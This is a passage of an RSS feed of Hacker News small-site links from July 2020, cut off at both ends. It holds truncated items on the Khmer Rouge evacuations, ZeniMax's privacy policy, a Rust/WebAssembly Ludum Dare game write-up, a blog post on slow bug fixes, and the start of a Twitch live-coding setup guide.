https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=150&amp;h=141 150w" sizes="(max-width: 300px) 100vw, 300px"></a><figcaption id="caption-attachment-466">The evacuation of Phnom Penh, 1975.</figcaption></figure>
<p>In Phnom Penh and other cities, the Khmer Rouge told <a href="https://en.wikipedia.org/wiki/Residency_(domicile)">residents</a> that they would be moved only about “two or three kilometers” outside the city and would return in “two or three days”. Some witnesses say they were told that the evacuation was because of the “threat of American bombing” and that they did not have to lock their houses since the Khmer Rouge would “take care of everything” until they returned. People who refused to evacuate would have their homes burned to the ground and would be killed immediately. The evacuees were sent on long marches to the countryside, which killed thousands of children, elderly people, and sick people.These were not the first evacuations of civilian populations by the Khmer Rouge; similar evacuations of populations without possessions had been occurring on a smaller scale since the early 1970s.</p>
<p>The entire population was forced to become farmers in <a href="https://en.m.wikipedia.org/wiki/Labour_camp">labor camps</a>. Cambodians were expected to produce three tons of rice per hectare; before the Khmer Rouge era, the average was only one ton per hectare. The total lack of agricultural knowledge by the former city dwellers made <a href="https://en.m.wikipedia.org/wiki/Famine">famine</a> inevitable. Rural dwellers were often unsympathetic or too frightened to assist them. Such acts …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</a></em></p>]]>
            </description>
            <link>https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836985</guid>
            <pubDate>Tue, 14 Jul 2020 19:57:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doom Eternal Privacy Policy Allows Collection and Disclosure of Medical Records]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 125 (<a href="https://news.ycombinator.com/item?id=23836876">thread link</a>) | @gentleman11
<br/>
July 14, 2020 | https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html | <a href="https://web.archive.org/web/*/https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><img src="https://esrbstorage.blob.core.windows.net/esrbcontent/images/privacy_certified_globe_color.gif" alt="ESRB PRIVACY CERTIFIED MEMBER CONFIRMATION"></p>

<p>Last Updated: January 27, 2020</p>
<p>This ZeniMax Media Online Privacy Policy ("<strong>Policy</strong>") describes how ZeniMax Media Inc. and our affiliates and subsidiaries (collectively, "<strong>ZeniMax</strong>", "<strong>we</strong>" or "<strong>us</strong>") collect, use and otherwise process the personal information we collect about our about customers, purchasers, subscribers, and/or users (each a " <strong>User</strong>") of our mobile applications, games, websites and other online services (collectively, our " <strong>Services</strong>").</p>
<table>
  <tbody><tr>
    <th colspan="3">Overview of Our Collection and Use of Personal Information</th>
  </tr>
  <tr>
    <td colspan="3">This table provides an overview and is intended to summarize key information about our information practices, which are further explained in our Privacy Policy below.  The actual information we collect about you and the use of such personal information will vary depending upon the nature of our relationship and interactions with you. </td>
  </tr>
  <tr>
    <td colspan="2">Categories of personal information collected  </td>
    <td colspan="1">Uses of personal information </td>
  </tr>
  <tr>
    <td colspan="2"><b>Name, contact info and other identifiers</b> (e.g., name, email, address, username and alias; UID, BUID, device id, third party platform identifiers and account details (e.g., PlayStationÂ®, Xbox, Steam, Facebook), and other online or unique identifiers)</td>
    <td rowspan="7">
    <ul>
      <li>Providing our Services and related support</li>
      <li>Protecting the integrity of the Services</li>
      <li>Analyzing and improving the Services and our business</li>
      <li>Personalizing the Services</li><li>Advertising, marketing and promotional purposes</li>
      <li>Securing and protecting our business</li>
      <li>Defending our legal rights</li>
      <li>Auditing, reporting, corporate governance, and internal operations</li>
      <li>Complying with legal obligations</li>
    </ul>
</td>
  </tr>
   <tr>
    <td colspan="2"><b>Paper and electronic customer records</b> (e.g., your account and profile, which contains personal information, such as username, name, demographics and other characteristics or descriptions, email, address, telephone number, and other contact information, account credentials, communications preferences, and customer service and support tickets and other records)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Purchase history and tendencies</b> (e.g., information about your subscriptions current and past payments and purchases, and your purchase tendencies)</td>
  </tr>
   <tr>
     <td colspan="2"><b>Usage data</b> (e.g., usage and preference details related to your use of the Services, such as language, in-game purchases, game-play statistics, scores, persona, characters, achievements, rankings, time spent playing, click paths, game profile, preferences and friends)</td>
  </tr>
  <tr>
    <td colspan="2"><b>Geolocation data</b> (e.g., for mobile games users)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Audio, video and other electronic data</b> (e.g., call recordings of customer support calls, and User photos submitted to the Services)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Profiles and inferences</b> (e.g., profiles based on your account and activities, that reflect your preferences, characteristics, and abilities related to the Services)</td>
  </tr>
   <tr>
    <td colspan="3"><b>ESRB Privacy certification.</b> ZeniMax values the importance of your privacy and has received the ESRB Privacy Certification. ZeniMax is a valid licensee, and participating member of the Entertainment Software Rating Board's Privacy Certified Program (â€œ<b>ESRB Privacy Certified</b>â€�). All Services where this Policy is posted and which display an ESRB certification seal have been reviewed and certified by ESRB Privacy Certified to meet established online information collection, use and disclosure practices. As a licensee of this privacy program, we are subject to audits of our Services and other enforcement and accountability mechanisms administered independently by the ESRB.</td>
  </tr>
    <tr>
      <td colspan="3"><b>Individual rights.</b> Please see Section 12. User Rights and Choices below for a description of the choices we provide and the rights you have regarding your personal information. If you are a California resident, please be sure to review Section 15.a.  <u>Additional information for California Residents</u> below for important information about the categories of personal information we collect and disclose and your rights under California privacy laws.  If you are in the European Economic Area, please see Section 15.b. <u>Users in the European Economic Area</u> for more information about your rights under the EU General Data Protection Regulation (GDPR).</td>
  </tr>
</tbody></table>

<p>Scope of Our Policy</p>
<p>Personal Information We Collect</p>
<p>Purposes of Use and Legal Bases for Processing of Personal Information</p>
<p>Disclosure and Sharing of Personal Information</p>
<p>Cookies, Analytics and Personalization</p>
<p>Interest-based Advertising</p>
<p>Third Party Links and Features</p>
<p>User Generated Content</p>
<p>Security of Your Information</p>
<p>Data Retention</p>
<p>International Transfers of Data</p>
<p>User Rights and Choices</p>
<p>Contact Details</p>
<p>Changes to this Policy</p>
<p>Additional Information for Users in Certain Jurisdictions</p>
<p><strong>1.</strong>  <strong>Scope of Our Policy</strong></p>
<p>This Policy applies to the personal information that ZeniMax collects and processes about Users related to our Services, including games published by Bethesda Softworks and ZeniMax Online Studios, and games developed by other ZeniMax studios; more information about our studios is available at www.zenimax.com/studios.  This Policy does not apply to any third party websites, services, products or mobile applications maintained by other companies, which are linked to from our Services.</p>
<p>By registering for an account with us, providing your information to us through the Services, or otherwise using any of our Services, you understand and acknowledge that ZeniMax may process your personal information in accordance with this Policy. If you do not want this Policy to apply to you, please do not use the Services or communicate with us via the Services. If required by applicable law, we will obtain your consent to our collection, use, transfer and disclosure of your personal information.</p>
<p><strong>Personal Information.</strong>  In this Policy, our use of the term "personal information" includes other similar terms under applicable privacy lawsâ€”such as "personal data" and "personally identifiable information."  In general, personal information includes any information that identifies, relates to, describes, or is reasonably capable of being associated, or reasonably linked or linkable with a particular individual.</p>
<p><strong>Not Covered by this Policy.</strong>  This Policy does not apply to job applicants and candidates who apply for employment with us, or to employees and non-employee workers in the context of our working relationship with them.</p>
<p><strong>2.</strong>  <strong>Personal Information We Collect</strong></p>
<p>The information we collect about Users varies depending upon the circumstances and the Services used.</p>
<p>ZeniMax collects personal information directly from Users, automatically related to the use of the Services, and in some cases, from third parties (such as social networks, platform providers, payment processors, and operators of certain third party services that we use).</p>
<p><strong>Information We Collect From You</strong>.  Generally, we collect your personal information on a voluntary basis. However, if you decline to provide certain personal information that is marked mandatory, you may not be able to access certain Services or we may be unable to fully respond to your inquiry. We collect the following personal information from you:</p>
<ul>
<li>
<p>Registration and Profile Information.  To access and use certain Services (e.g., to register a game, download or use a mobile application, access subscription-based Services, create an account) you may be required to register with us, by providing us with certain required information, which is identified on the registration page. Depending upon the Services you use, this may include your name, a username and password, as well as country of residence, email, and contact information; certain Services will not be available if you decline to provide required information. We may also ask you or allow you to submit certain optional information, which may include your phone number, birthdate, location, preferences, a photo or avatar, and other profile information.</p>
</li>
<li>
<p>Purchases and Payments Information.  If you make a purchase or sign up for certain subscription-based Services, you are required to provide your payment information, including name, billing and shipping address and details, payment type, as well as credit card number or other payment account details (e.g., PayPal). We work with third parties like payment processors and fulfillment partners to process these payments. We do not collect, receive, process or store credit card or debit card numbers, or other third-party payment account credentials (e.g., PayPal); this information is collected directly by these third parties. Depending upon the Service, we may receive your username, name, email, the payment type, product(s) or service(s), and other transaction details, and maintain records of your purchase and subscription history.</p>
</li>
<li>
<p>Marketing, Contests and Promotions.  Users can sign up online or in-person (e.g., at tradeshows, conferences and the like) to receive direct marketing communications from us, including emails about game launches, developments, and upcoming releases. If you agree to receive direct marketing communications from us, we collect your email address, and we may also collect your name, preferences, and if relevant, information about your account and the Services and other games you use. We may also run contests, sweepstakes or other events or activities (collectively, "events") on our websites and social media channels. Information collected for these events may include your name, age, email address, and other information.</p>
</li>
<li>
<p>Your Communications.  When you email us, call us, or otherwise send us communications regarding the Services, we collect and maintain a record of your contact details, communications and our responses. We may also maintain records of the in-game communications and information that you post in chat sessions, forums, and in other areas of the Services.</p>
</li>
</ul>
<p><strong>Information We Collect and Receive From Third Parties</strong>.  We may collect and receive personal information about you from third parties, such as:</p>
<ul>
<li>
<p>Third Party Platforms.  You may be able to login through or connect certain third party accounts (each a " <strong>Third Party Account</strong>")â€”such as Steam, Twitch, Xbox Live, PSN and Facebookâ€”to your account with us.  These Third Party Accounts are operated and managed by third …</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</a></em></p>]]>
            </description>
            <link>https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836876</guid>
            <pubDate>Tue, 14 Jul 2020 19:49:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ludum Dare in 48 hours with Rust and WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23836386">thread link</a>) | @yannikyeo
<br/>
July 14, 2020 | https://ianjk.com/rust-gamejam/ | <a href="https://web.archive.org/web/*/https://ianjk.com/rust-gamejam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p><a href="https://ldjam.com/">Ludum Dare</a>, the world's premiere 48 hour solo gamejam, occurred back in April.</p>
<p>Ludum Dare has two tracks: the 'Compo' and the 'Jam'.</p>
<p>The rules of the Compo require you to make a game (other than source code) within 48 hours. At the end your fellow entrants will rate your game and your game will be ranked against your peers.</p>
<p>With everyone quarantined at home due to Coronavirus this April's Ludum Dare had vastly more entrants than usual. A total of 1383 people entered the Compo and there were 3576 entries to the Jam. That's an absurd amount of games!</p>
<p>I've entered the Compo a <a href="https://ldjam.com/events/ludum-dare/43/blueberry-bounce">few</a> <a href="https://ldjam.com/events/ludum-dare/42/noahs-help-1">times</a> using Unity, but this time around I wanted to write a game purely with the relatively new programming language Rust.</p>
<p>This post started out focused on the experience of using Rust, but turned into a general overview of the technical and design process for the game.</p>
<span id="continue-reading"></span>
<p><a href="https://www.rust-lang.org/">Rust</a> is a 'systems programming language' focused on performance and safety. 'Safety' means that Rust helps you avoid certain classes of vulnerabilities and crashes. I have been using Rust for my personal work and decided now was the time to give it a shot for a gamejam.</p>
<h2 id="why-not-unity">Why not Unity?</h2>
<p>I've entered at least five past Ludum Dares with Unity, and Unity with C# is by far the most common set of tools used for Ludum Dare. But I just simply haven't been enjoying Unity as much recently.</p>
<p>Unity is a giant game engine, but I find it hard to get into a flow state with. There are too many knobs, features, and ways to do things. It's easy to flip a bunch of switches and have something decent, but that just doesn't mesh with my personal design flow. I prefer to work in a clean mental environment, not a complex editor.</p>
<p>Additionally Unity's WebGL build takes around 20 minutes on my laptop, which is absolutely miserable.</p>

<p>I've been coding exclusively on a 2016 Macbook Pro for a while now. It's not the best, but not the worst.</p>
<p>I could have used an existing Rust game engine, but I'm not familiar with the popular ones. Instead I cobbled together a mix of Rust libraries and various personal Rust scripts.</p>
<p>Rust makes it trivially easy to use other libraries (which it calls crates) through its package manager <a href="https://crates.io/">crates.io</a>.</p>
<p>For this project I used the following crates:</p>
<ul>
<li><a href="https://github.com/kettle11/kApp">kApp</a> My personal windowing and input library designed to build super fast.</li>
<li><a href="https://github.com/rustwasm/wasm-bindgen">wasm-bindgen</a> The Rust ecosystem's standard way to call Javascript from Rust</li>
<li><a href="https://github.com/grovesNL/glow">glow</a> "GL on whatever" A wrapper around OpenGL and WebGL.</li>
</ul>
<p>The recommended way to work with Rust and WebAssembly (Wasm) is through a command line tool called <a href="https://github.com/rustwasm/wasm-pack"><code>wasm-pack</code></a>. I skipped using <code>wasm-pack</code> and instead just used a two line bash script that would run a Rust build and then call <code>wasm-bindgen</code> directly to generate the web bindings.</p>
<p>Quick iteration times are absolutely critical for a gamejam. The following tools were instrumental in attaining quick iteration times:</p>
<ul>
<li><a href="https://github.com/passcod/cargo-watch"><code>cargo watch</code></a> ran the build script automatically whenever the code was saved.</li>
<li><a href="https://crates.io/crates/devserver/0.1.0"><code>devserver</code></a> hosted the local web page and automatically reloaded it when a file changed</li>
<li>Visual Studio Code was configured to automatically save</li>
</ul>
<p>The combination of <code>cargo watch</code>, <code>devserver</code>, and the Visual Studio Code settings meant that I could edit a value, like a color, in my Rust code and watch it change on the web page nearly instantly.</p>
<p>Typical Rust build times were around 1-3 seconds while working on this project, but sometimes they'd inexplicably go up to around 10 seconds. Rust is known for slow build times, and these quick iteration times were only possible by carefully choosing tiny crates. My goal was to always have the new build ready on the web page by the time I changed to the browser window.</p>
<h2 id="code-structure">Code Structure</h2>
<p>With only 48 hours best practices go out the window, but even still I made some early choices to help make writing new code as easy as possible. One of the key things I wanted to ensure was that if I were to declare a new variable, or load a new asset, that it would only have to be declared once. Many Rust frameworks follow a pattern a bit like the following:</p>
<pre><code><span>struct </span><span>Game </span><span>{
    </span><span>player</span><span>:</span><span> Player,
    </span><span>/* Other stuff */
</span><span>}

</span><span>impl </span><span>Game </span><span>{
    </span><span>fn </span><span>setup</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) -&gt;</span><span> Game </span><span>{</span><span>
        Game </span><span>{</span><span>
            player</span><span>: </span><span>Player</span><span>::</span><span>new</span><span>(),
        }
    }

    </span><span>fn </span><span>update</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) {
        </span><span>/* Respond to user input and redraw here*/
    </span><span>}
}
</span></code></pre>
<p>The above works fine in regular scenarios, but when you add a new variable like 'player' it needs to be declared in multiple places. Instead I used a structure a bit like the following:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>loop </span><span>{
        </span><span>/* Respond to user input and redraw here forever*/
    </span><span>}
}
</span></code></pre>
<p>This let me declare a variable and use it immediately, no extra fuss.</p>
<h2 id="async">Async</h2>
<p>Unfortunately the above structure doesn't work on web. On Web the main loop must return control to the browser.</p>
<p>The way to get around this is to pass a closure that the browser calls when an event occurs:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
        </span><span>/* Respond to events and draw here */
    </span><span>});
}
</span></code></pre>
<p>Rust windowing and input frameworks like <a href="https://github.com/rust-windowing/winit">Winit</a> use the above approach.</p>
<p>Another issue on web is loading assets. On non-web platforms it's simple to just wait for an asset to be done loading:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>std</span><span>::</span><span>fs</span><span>::</span><span>read</span><span>("</span><span>wind.wav</span><span>").</span><span>unwrap</span><span>();
</span></code></pre>
<p>On web the above isn't possible because it would prevent returning control to the browser. It's not appropriate to lock up while waiting for an an asset to return from a server, so all loads are asynchronous.</p>
<p>An approach like the following could be used in Rust:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>fetch_asset</span><span>("</span><span>wind.wav</span><span>");

</span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>None</span><span>;
    </span><span>/* Respond to events and draw requests here */
    </span><span>if let </span><span>Some</span><span>(</span><span>loaded_asset</span><span>) =</span><span> wind_sound_handle</span><span>.</span><span>get_asset</span><span>() {</span><span>
        window_sound </span><span>=</span><span> loaded_asset</span><span>;
    }

    </span><span>/* Respond to events and draw here */
</span><span>});
</span></code></pre>
<p>But that approach can lead to tedious bookkeeping, which is the opposite of what you want for a gamejam.</p>
<p>Instead I decided to use Rust's relatively new feature: <code>async</code>. Fortunately I had recently added <code>asyc</code> support to <code>kApp</code>.</p>
<p>Rust's <code>async</code> feature generates a state machine for a function that allows it to pause and later resume when ready.</p>
<p>An <code>async</code> function can look very similar to a traditional infinite game loop:</p>
<pre><code><span>async </span><span>fn </span><span>run</span><span>(</span><span>app</span><span>:</span><span> Application, </span><span>events</span><span>:</span><span> Events</span><span>) {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>audio</span><span>::</span><span>load_audio</span><span>("</span><span>wind.wav</span><span>").</span><span>await</span><span>.</span><span>unwrap</span><span>();
    </span><span>loop </span><span>{
        </span><span>match</span><span> events</span><span>.</span><span>next_event</span><span>().</span><span>await </span><span>{
            </span><span>/* Respond to events and draw here */
        </span><span>}
    }
}
</span></code></pre>
<p>This let me load assets with one line and not have to worry about any bookkeeping. Perfect!</p>
<h2 id="game-design">Game Design</h2>
<p>The theme for this Ludum Dare was "Keep It Alive" which immediately struck me as overly morbid given the rapid spread of coronavirus. I couldn't motivate myself to create a game about death, and I nearly decided to quit the jam entirely.</p>
<p>Instead I looked for alternative ways to interpret the theme. As I stared out my apartment window towards San Francisco hills I thought about the way people droop their heads as they walk to and from work. It's a beautiful world, but it's tough to notice the beauty every day when the routine of life weighs heavy.</p>
<p>What if you played as a spirit to lift people up? You could keep their "wonder" alive. You'd play as some sort of spirit and perhaps you'd lift a commuter bicyclist up into the sky where you'd whisk them around and show them the stars.</p>
<p>I imagined you'd guide the bicyclist through the sky to collect stars and people on the ground would notice and point up in awe.</p>
<p>It was difficult to figure out how to pair that idea to gameplay, but what I settled upon was a game inspired by the old school flash game <a href="https://www.linerider.com/">Line Rider</a>.</p>
<p>You'd draw lines for the bicyclist and they'd roll along those lines and bump into collectible stars.</p>
<h2 id="implementation">Implementation</h2>
<p>The plan was to implement the physics of the character as a rolling ball and then substitute in character art for the bicyclist.</p>
<p>The first thing I needed was line rendering. I ripped some code out of a prior Rust project that would generate mesh line segments by creating rectangles with circles at the ends. I wasn't sure if this heavy-handed approach to line joins would cause problems. Each individual line segment was made up of a bunch of triangles so I felt that perhaps the game would lag as too many lines appeared.</p>
<p>I stress tested this by scribbling the entire screen full of lines over and over, and I was shocked when the framerate didn't drop at all.</p>
<p>For the physics I took some math for finding the closest point on a line to the ball. If the point is inside the ball then check if the ball's velocity is moving towards the point. If the ball is moving towards the point then "bounce" the ball by pushing the opposite direction on the ball.</p>
<p>The heart of the collision code wasn't very long at all:</p>
<pre><code><span> </span><span>fn </span><span>check_lines</span><span>(&amp;</span><span>mut </span><span>self</span><span>, </span><span>points</span><span>: &amp;</span><span>[Vector3]</span><span>) {
    </span><span>let</span><span> len </span><span>=</span><span> points</span><span>.</span><span>len</span><span>();

    </span><span>for</span><span> i </span><span>in (</span><span>1</span><span>..</span><span>len</span><span>).</span><span>step_by</span><span>(</span><span>2</span><span>) {
        </span><span>let </span><span>(</span><span>distance</span><span>,</span><span> p</span><span>) = </span><span>point_with_line_segment</span><span>(</span><span>self</span><span>.</span><span>position</span><span>,</span><span> points</span><span>[</span><span>i </span><span>- </span><span>1</span><span>],</span><span> points</span><span>[</span><span>i</span><span>]);

        </span><span>if</span><span> distance
            </span><span>&lt; (</span><span>self</span><span>.</span><span>radius </span><span>+ </span><span>LINE_RADIUS </span><span>- </span><span>0.001</span><span>/* Allow ball to sink slightly into surface*/</span><span>)
        {
            </span><span>let</span><span> normal_of_collision </span><span>= (</span><span>self</span><span>.</span><span>position </span><span>-</span><span> p</span><span>).</span><span>normal</span><span>();
            </span><span>let</span><span> velocity_along_collision </span><span>= </span><span>Vector3</span><span>::</span><span>dot</span><span>(</span><span>normal_of_collision</span><span>, </span><span>self</span><span>.</span><span>velocity</span><span>);
            </span><span>if</span><span> velocity_along_collision </span><span>&lt; </span><span>0.0 </span><span>{
                </span><span>self</span><span>.</span><span>velocity </span><span>-=</span><span> normal_of_collision </span><span>*</span><span> velocity_along_collision </span><span>* </span><span>1.4</span><span>;
            }
            </span><span>self</span><span>.</span><span>position </span><span>+=</span><span> normal_of_collision </span><span>* </span><span>0.0001</span><span>;
        }
    }
}
</span></code></pre>
<p>(The code could have been a little cleaner had I known about the <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks">chunks</a> method on iterators.)</p>
<p>I was pretty surprised at how great the ball physics felt without much tuning. When I started with this design the physics felt like a big unknown for me. I felt like I might not be able to get them right within the 48 hour window, but coding the physics was actually one of the shortest features in the project.</p>
<p>I was pretty concerned that the …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ianjk.com/rust-gamejam/">https://ianjk.com/rust-gamejam/</a></em></p>]]>
            </description>
            <link>https://ianjk.com/rust-gamejam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836386</guid>
            <pubDate>Tue, 14 Jul 2020 19:14:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You've only added two lines – why did that take two days?]]>
            </title>
            <description>
<![CDATA[
Score 812 | Comments 459 (<a href="https://news.ycombinator.com/item?id=23835918">thread link</a>) | @gregdoesit
<br/>
July 14, 2020 | https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html | <a href="https://web.archive.org/web/*/https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pagepbt">
<!-- #masthead -->
<div id="contentpbt">
<div id="primarypbt">
<div id="mainpbt" role="main">
<div id="mainblogsec"><div data-version="1" id="Blog1">
<div>
<!--Can't find substitution for tag [defaultAdStart]-->

          <div>
        


          <div>
        
<div>
<article itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a name="8378966868534474355"></a>


<div id="post-body-8378966868534474355" itemprop="articleBody"><p>
It might seem a reasonable question, but it makes some terrible assumptions:</p><ul>
<li>lines of code = effort</li>
<li>lines of code = value</li>
<li>all lines of code are equal</li>
</ul>

<p>
Why did a fix that seems so simple when looking at the changes made take two days to complete?</p>
<div>
<ul>
<li><b>Because the issue was reported with a vague description of how to recreate it.</b> It took me several hours to get to a reliable reproduction of the item. Some developers would have immediately gone back to the person reporting the problem and required more information before investigating. I try and do as much as I can with the information provided. I know some developers don't like having to fix bugs, and so do whatever they can to get out of it. Claiming there isn't enough is a great way to look like you're trying to help but not have to do anything. I know that reporting errors can be hard, and I'm grateful for anyone who does. I want to show appreciation for error reports by trying to do as much as possible with the information provided before asking for more details.</li>
<li><b>Because the reported issue was related to functionality, I'm not familiar with.</b>&nbsp;The feature it was to do with was something I rarely use and is not something I've ever used in great detail. This meant it took me longer than it might to understand how to use it and the nuances of how it interacts with the software with the bug.</li>
<li><b>Because I took the time to investigate the real cause of the issue, not just looking at the symptoms</b>. If some code is throwing an error, you could just wrap it in a try..catch statement and suppress the error. No error, no problem. Right? Sorry, for me, making the problem invisible isn't the same as fixing it. "Swallowing" an error can easily lead to other unexpected side-effects. I don't want to have to deal with them at a point in the future.</li>
<li><b>Because I investigated if there were other ways of getting to the same problem, not just the reported reproduction steps</b>. One set of reproduction steps can easily make the error appear to be in one place when it may actually be more deep-seated. Finding the exact cause of a problem, and looking at all the ways to get there can provide valuable insights. Insights such as how the code is actually used, where there might be other places with possible (other?) problems that might need addressing, or it may show inconsistencies in the code that mean an error is caused (or handled) in one code path but not another.</li>
<li><b>Because I took the time to verify if there were other parts of the code that might be affected in similar ways</b>. If a mistake led to the bug, the same error could have also been made elsewhere in the code-base. Now's a great time to check.&nbsp;</li>
<li><b>Because when I found the cause of the issue, I looked to find the simplest way of fixing it that would have minimal risk of introducing side-effects</b>. I don't want the quickest possible fix. I want a fix that isn't likely to cause confusion or other problems in the future.</li>
<li><b>Because I tested the change thoroughly and verified that it addressed the problem for all the different code paths that were affected</b>. I don't want to rely on someone else to have to test that what I've done is correct. I don't want a bug to be found in the future and for me to have to come back to this code when I've mentally moved on. Context switching is expensive and frustrating. Having a dedicated tester have to look at the "same" change again is something I want to avoid whenever possible.</li>
</ul>

</div>
<div><p>
I don't like having to fix bugs. Partly because they can feel like the result of a previous failure on my part. The other reason I don't like fixing bugs is that I'd prefer to be working on new things.</p><p>

What's worse than having to fix a bug?<br>
Having to fix the same bug repeatedly.<br>
I take the time to make sure any bug is totally fixed any time it is encountered so that it doesn't need to be faced, investigated, fixed, and tested more than once.</p></div>





</div>

<div>
<p><span>
<span>
<a href="https://www.blogger.com/email-post.g?blogID=33176002&amp;postID=8378966868534474355" title="Email Post">
<img alt="" height="13" src="https://img1.blogblog.com/img/icon18_email.gif" width="18">
</a>
</span>
</span></p>

</div>





</article>




</div>

        </div></div>
      
<!--Can't find substitution for tag [adEnd]-->
</div>

</div></div>
</div><!-- #main -->
</div><!-- #primary -->
<!-- #secondary -->
</div><!-- #content -->
<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23835918</guid>
            <pubDate>Tue, 14 Jul 2020 18:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Run a Live Coding Stream on Twitch Using OBS]]>
            </title>
            <description>
<![CDATA[
Score 450 | Comments 170 (<a href="https://news.ycombinator.com/item?id=23834153">thread link</a>) | @jordanlewis
<br/>
July 14, 2020 | https://jordanlewis.org/posts/twitch-live-coding/ | <a href="https://web.archive.org/web/*/https://jordanlewis.org/posts/twitch-live-coding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
		

		<section>
    <div>
      <p><img src="https://jordanlewis.org/images/stream/streaming-desk.jpg" alt="Stream software picture"></p>
<p>If you’re reading this post, you might be interested in trying your hand at
live coding on stream, as a way of sharing your projects in a more relatable,
immediate way than a polished blog post, teaching others about programming, or
just as a way to have fun. I think that live coding and streams in general are
an interesting possible future form of both education and entertainment, and if
you’re contemplating starting your own stream, I sincerely hope that you do it.</p>
<p>This month marks the 6 month anniversary of the first stream on <a href="https://twitch.tv/large__data__bank">LARGE DATA
BANK</a>, my Twitch live coding channel. It’s
grown from a one-off Friday experiment into a regularly scheduled part of my
life, a community of dozens of wonderful regular viewers and chatters, and
an activity that’s one of the top things I look forward to doing every week.</p>
<p>I’ve learned a lot along the way, and this detailed guide to the way I’ve
set up my stream is my attempt at stepping back and sharing those learnings in
the hopes of inspiring others to try this awesome hobby for themselves. I hope
it’s useful for you as you start your own journey into streaming.</p>
<p>If you have any questions that aren’t answered in this blog post, I’m more than
happy to answer them <a href="https://twitter.com/JordanALewis">on Twitter</a> or
<a href="https://jordanlewis.org/">elsewhere online</a>.</p>
<p>Also, please send me a follow on <a href="https://largedatabank.com/">Twitch</a> and
<a href="https://twitter.com/JordanALewis">Twitter</a> for stream notifications! I stream
every Friday at 3 PM ET, and most Sundays at some time in the afternoon.</p>
<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#obs-configuration">OBS configuration</a>
      <ul>
        <li><a href="#scenes">Scenes</a></li>
        <li><a href="#video">Video</a></li>
        <li><a href="#audio">Audio</a></li>
        <li><a href="#streaming-to-twitch-finally">Streaming to Twitch (finally)</a></li>
      </ul>
    </li>
    <li><a href="#stream-alerts">Stream Alerts</a>
      <ul>
        <li><a href="#sound-in-stream-alerts">Sound in Stream Alerts</a></li>
      </ul>
    </li>
    <li><a href="#channel-setup">Channel setup</a>
      <ul>
        <li><a href="#stream-category-and-tags">Stream Category and Tags</a></li>
        <li><a href="#panels">Panels</a></li>
        <li><a href="#emotes">Emotes</a></li>
        <li><a href="#banner-image">Banner image</a></li>
        <li><a href="#saving-videos">Saving Videos</a></li>
      </ul>
    </li>
    <li><a href="#chatbot">Chatbot</a></li>
    <li><a href="#becoming-a-twitch-affiliate">Becoming a Twitch Affiliate</a></li>
    <li><a href="#shoutouts">Shoutouts</a></li>
  </ul>
</nav>


<p>Whatever your reasons for wanting to try streaming, there’s quite a bit of setup
that you’ll need to do up front to try it out that can feel daunting. Everyone
has to go through this initial setup period, though, and so can you. You got
this!</p>
<p>The most important part of this post is the
